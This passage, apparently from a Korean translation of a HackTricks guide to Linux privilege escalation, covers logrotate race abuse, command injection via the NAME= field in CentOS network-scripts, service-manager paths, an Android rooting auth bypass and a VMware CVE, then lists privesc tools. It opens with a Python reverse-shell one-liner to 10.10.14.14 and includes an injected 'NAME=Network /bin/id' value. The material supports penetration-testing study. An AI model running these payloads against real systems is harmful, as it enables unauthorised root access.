import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### logrotate 악용

`logrotate`의 취약점으로 인해 로그 파일 또는 해당 상위 디렉터리에 **쓰기 권한**이 있는 사용자가 잠재적으로 권한을 상승시킬 수 있습니다. 이는 일반적으로 **root**로 실행되는 `logrotate`를 조작하여 임의의 파일을 실행할 수 있기 때문이며, 특히 _**/etc/bash_completion.d/**_와 같은 디렉터리에서 문제가 발생할 수 있습니다. _/var/log_뿐만 아니라 로그 rotation이 적용되는 모든 디렉터리에서 권한을 확인하는 것이 중요합니다.

> [!TIP]
> 이 취약점은 `logrotate` 버전 `3.18.0` 이하에 영향을 줍니다.

취약점에 대한 자세한 정보는 다음 페이지에서 확인할 수 있습니다: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

[**logrotten**](https://github.com/whotwagner/logrotten)을 사용하여 이 취약점을 exploit할 수 있습니다.

이 취약점은 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**와 매우 유사합니다. 따라서 로그를 변경할 수 있다는 것을 발견하면, 해당 로그를 누가 관리하는지 확인하고 로그를 symlink로 대체하여 권한을 상승시킬 수 있는지 확인해야 합니다.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 _/etc/sysconfig/network-scripts_에 `ifcf-<whatever>` script를 **write**할 수 있거나 기존 script를 **adjust**할 수 있다면, **system is pwned**입니다.

Network scripts는 예를 들어 _ifcg-eth0_와 같이 network connections에 사용됩니다. 이 파일들은 .INI 파일과 정확히 같은 형태입니다. 그러나 Linux에서는 Network Manager (dispatcher.d)가 이 파일들을 \~sourced\~합니다.

제 경우에는 이러한 network scripts의 `NAME=` attribute가 올바르게 처리되지 않습니다. 이름에 **white/blank space가 포함되어 있으면 시스템이 white/blank space 뒤의 부분을 실행하려고 합니다**. 즉, **첫 번째 blank space 이후의 모든 내용이 root 권한으로 실행됩니다**.

예: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network와 /bin/id 사이의 공백에 유의하세요_)

### **init, init.d, systemd, 및 rc.d**

`/etc/init.d` 디렉터리는 **classic Linux service management system**인 System V init (SysVinit)의 **scripts**를 포함합니다. 여기에는 서비스를 `start`, `stop`, `restart`하고 때로는 `reload`하는 scripts가 있습니다. 이러한 scripts는 직접 실행하거나 `/etc/rc?.d/`에 있는 symbolic links를 통해 실행할 수 있습니다. Redhat systems의 대체 경로는 `/etc/rc.d/init.d`입니다.

반면 `/etc/init`은 Ubuntu에서 도입된 새로운 **service management**인 **Upstart**와 관련 있으며, service management 작업에 configuration files를 사용합니다. Upstart로 전환된 이후에도 Upstart의 compatibility layer로 인해 SysVinit scripts는 Upstart configurations와 함께 계속 사용됩니다.

**systemd**는 modern initialization 및 service manager로 등장했으며, on-demand daemon starting, automount management, system state snapshots와 같은 advanced features를 제공합니다. distribution packages용 files는 `/usr/lib/systemd/`에, administrator modifications용 files는 `/etc/systemd/system/`에 구성하여 system administration process를 간소화합니다.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 syscall을 hook하여 userspace manager에 privileged kernel functionality를 노출합니다. Weak manager authentication (예: FD-order 기반 signature checks 또는 취약한 password schemes)은 local app이 manager를 사칭하고 이미 rooted된 devices에서 root로 escalate하도록 만들 수 있습니다. 자세한 내용과 exploitation details는 여기에서 확인할 수 있습니다:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations의 regex-driven service discovery는 process command lines에서 binary path를 추출하고 privileged context에서 `-v`와 함께 실행할 수 있습니다. 허용적인 patterns (예: \S 사용)은 writable locations (예: /tmp/httpd)에 attacker-staged listeners를 match할 수 있으며, 이는 root로 실행되는 결과로 이어질 수 있습니다 (CWE-426 Untrusted Search Path).

여기에서 자세한 내용과 다른 discovery/monitoring stacks에 적용할 수 있는 generalized pattern을 확인할 수 있습니다:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors를 찾는 최고의 tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux 및 MAC의 kernel vulns를 Enumerate [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
